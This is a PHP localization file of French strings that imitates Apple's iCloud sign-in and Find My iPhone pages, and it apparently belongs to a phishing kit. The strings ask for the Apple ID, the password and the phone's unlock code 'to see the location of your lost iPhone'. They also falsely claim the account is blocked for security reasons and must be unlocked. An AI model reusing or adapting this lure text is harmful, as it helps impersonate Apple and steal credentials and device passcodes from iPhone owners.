<?php
/*
------------------
Language: Frensh
------------------
*/
 
 
/* MIOS */
$lang = array();

$lang['TTILE'] = 'iCloud';
$lang['DESCRIP'] = 'Connectez-vous à iCloud pour accéder à vos photos, vidéos, documents, notes, contacts et bien plus encore. Utilisez votre identifiant Apple ou créez un compte pour commencer à utiliser les services Apple.';
$lang['DESCARGA'] = 'Téléchargez iCloud pour Windows';
$lang['ACTULIZADO'] = 'Gardez à jour la dernière version de tous vos documents, vidéos, photos et bien plus encore, sur votre PC.';
$lang['DESCARGA_AHORA'] = 'Télécharger maintenant';


//Header
$lang['CREAR_ID_APPLE'] = 'Créer un identifiant Apple';
$lang['ESTADO_SISTEMA'] = 'État du système';
 
$lang['POLICY'] = 'Politique de confidentialité';
$lang['TERMS'] = 'Termes et conditions';
$lang['COPYRIGHT'] = 'Copyright © 2021 Apple Inc. Tous droits réservés';


$lang['COD_BLOQUEO'] = 'Entrez votre code de déverrouillage';
$lang['INCORRECTO'] = 'Mauvais code de verrouillage.';
$lang['COMENTARIO'] = "Entrez votre code de verrouillage pour voir l'emplacement de votre iPhone perdu.";

$lang['NO_CODIGO'] = 'Vous ne vous souvenez pas de votre code?';
$lang['BLOQ_SEGURIDAD'] = 'Cet identifiant Apple a été bloqué pour des raisons de sécurité.';

$lang['COM_DEB_CUENTA'] = 'Avant de pouvoir vous connecter, vous devez déverrouiller le compte.';

$lang['DEB_CUENTA'] = 'Déverrouiller compte';
 
$lang['VERIFI_PATRON'] = 'Vérification…'; 





//DATOS 

$lang['SIGN_IN_TITLE'] = 'Connectez-vous à iCloud';
$lang['APPLE_ID'] = 'identifiant Apple';


$lang['PASSWORD'] = 'Mot de passe';
$lang['APPLE_INCORRECTO'] = "Le mot de passe ou l'identifiant Apple est incorrect.";
$lang['FORGOT_ID'] = 'Avez-vous oublié le mot de passe?';
$lang['PER_CONECTADO'] = 'Rester connecté';
$lang['OLVIDADO'] = 'Vous avez oublié votre identifiant Apple ou votre mot de passe?';



 
 
?>